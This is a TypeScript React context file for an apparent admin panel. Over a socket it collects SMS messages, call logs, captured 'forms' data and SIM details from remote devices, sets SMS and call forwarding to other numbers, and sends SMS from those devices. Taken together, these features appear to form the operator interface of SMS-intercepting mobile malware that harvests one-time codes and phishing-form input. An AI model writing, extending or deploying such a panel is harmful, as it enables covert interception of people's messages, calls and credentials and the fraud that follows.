import { createContext, useContext, useEffect, useState, ReactNode, useCallback } from 'react';
import { useSocket } from './SocketContext';
import { Device, DeviceData, SimInfo } from '../types';

interface DeviceContextType {
    devices: Device[];
    deviceData: Map<string, DeviceData>;
    getDeviceData: (deviceId: string) => void;
    updateForwarding: (deviceId: string, config: Partial<DeviceData['forwarding']>) => void;
    requestSync: (deviceId: string) => void;
    sendSms: (deviceId: string, recipientNumber: string, message: string, subscriptionId?: number) => Promise<boolean>;
}

const DeviceContext = createContext<DeviceContextType>({
    devices: [],
    deviceData: new Map(),
    getDeviceData: () => { },
    updateForwarding: () => { },
    requestSync: () => { },
    sendSms: async () => false,
});

export function DeviceProvider({ children }: { children: ReactNode }) {
    const { socket } = useSocket();
    const [devices, setDevices] = useState<Device[]>([]);
    const [deviceData, setDeviceData] = useState<Map<string, DeviceData>>(new Map());

    useEffect(() => {
        if (!socket) return;

        // Listen for device updates
        socket.on('devices:update', (updatedDevices: Device[]) => {
            console.log('[Devices] Updated:', updatedDevices.length);
            setDevices(updatedDevices);
        });

        // Listen for SMS updates
        socket.on('sms:update', (data: { deviceId: string; sms: DeviceData['sms'] }) => {
            console.log('[SMS] Update for device:', data.deviceId);
            setDeviceData(prev => {
                const newMap = new Map(prev);
                const existing = newMap.get(data.deviceId) || { deviceId: data.deviceId, sms: [], calls: [], forms: [], forwarding: { smsEnabled: false, smsForwardTo: '', callsEnabled: false, callsForwardTo: '' } };
                newMap.set(data.deviceId, { ...existing, sms: data.sms });
                return newMap;
            });
        });

        // Listen for calls updates
        socket.on('calls:update', (data: { deviceId: string; calls: DeviceData['calls'] }) => {
            console.log('[Calls] Update for device:', data.deviceId);
            setDeviceData(prev => {
                const newMap = new Map(prev);
                const existing = newMap.get(data.deviceId) || { deviceId: data.deviceId, sms: [], calls: [], forms: [], forwarding: { smsEnabled: false, smsForwardTo: '', callsEnabled: false, callsForwardTo: '' } };
                newMap.set(data.deviceId, { ...existing, calls: data.calls });
                return newMap;
            });
        });

        // Listen for forms updates
        socket.on('forms:update', (data: { deviceId: string; forms: DeviceData['forms'] }) => {
            console.log('[Forms] Update for device:', data.deviceId);
            setDeviceData(prev => {
                const newMap = new Map(prev);
                const existing = newMap.get(data.deviceId) || { deviceId: data.deviceId, sms: [], calls: [], forms: [], forwarding: { smsEnabled: false, smsForwardTo: '', callsEnabled: false, callsForwardTo: '' } };
                newMap.set(data.deviceId, { ...existing, forms: data.forms });
                return newMap;
            });
        });

        // Listen for full device data
        socket.on('deviceData:update', (data: DeviceData) => {
            console.log('[Device Data] Full update for:', data.deviceId);
            setDeviceData(prev => {
                const newMap = new Map(prev);
                newMap.set(data.deviceId, data);
                return newMap;
            });
        });

        // Listen for forwarding updates
        socket.on('forwarding:updated', (data: { deviceId: string; config: DeviceData['forwarding'] }) => {
            console.log('[Forwarding] Updated for device:', data.deviceId);
            setDeviceData(prev => {
                const newMap = new Map(prev);
                const existing = newMap.get(data.deviceId);
                if (existing) {
                    newMap.set(data.deviceId, { ...existing, forwarding: data.config });
                }
                return newMap;
            });
        });

        // Listen for SIM card updates
        socket.on('sim:update', (data: { deviceId: string; simCards: SimInfo[] }) => {
            console.log('[SIM] Update for device:', data.deviceId);
            setDeviceData(prev => {
                const newMap = new Map(prev);
                const existing = newMap.get(data.deviceId) || { deviceId: data.deviceId, sms: [], calls: [], forms: [], forwarding: { smsEnabled: false, smsForwardTo: '', callsEnabled: false, callsForwardTo: '' } };
                newMap.set(data.deviceId, { ...existing, simCards: data.simCards });
                return newMap;
            });
        });

        return () => {
            socket.off('devices:update');
            socket.off('sms:update');
            socket.off('calls:update');
            socket.off('forms:update');
            socket.off('deviceData:update');
            socket.off('forwarding:updated');
            socket.off('sim:update');
        };
    }, [socket]);

    const getDeviceData = (deviceId: string) => {
        if (socket) {
            socket.emit('admin:getDeviceData', deviceId);
        }
    };

    const updateForwarding = (deviceId: string, config: Partial<DeviceData['forwarding']>) => {
        if (socket) {
            socket.emit('forwarding:update', { deviceId, config });
        }
    };

    const requestSync = (deviceId: string) => {
        if (socket) {
            socket.emit('admin:requestSync', deviceId);
        }
    };

    const sendSms = useCallback(async (deviceId: string, recipientNumber: string, message: string, subscriptionId?: number): Promise<boolean> => {
        if (!socket) return false;

        const requestId = `${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;

        return new Promise((resolve) => {
            const timeout = setTimeout(() => {
                socket.off('sms:sendResult', handleResult);
                resolve(false);
            }, 30000); // 30 second timeout

            const handleResult = (data: { deviceId: string; requestId: string; success: boolean }) => {
                if (data.requestId === requestId) {
                    clearTimeout(timeout);
                    socket.off('sms:sendResult', handleResult);
                    resolve(data.success);
                }
            };

            socket.on('sms:sendResult', handleResult);
            socket.emit('admin:sendSms', { deviceId, recipientNumber, message, subscriptionId, requestId });
        });
    }, [socket]);

    return (
        <DeviceContext.Provider value={{ devices, deviceData, getDeviceData, updateForwarding, requestSync, sendSms }}>
            {children}
        </DeviceContext.Provider>
    );
}

export function useDevices() {
    return useContext(DeviceContext);
}
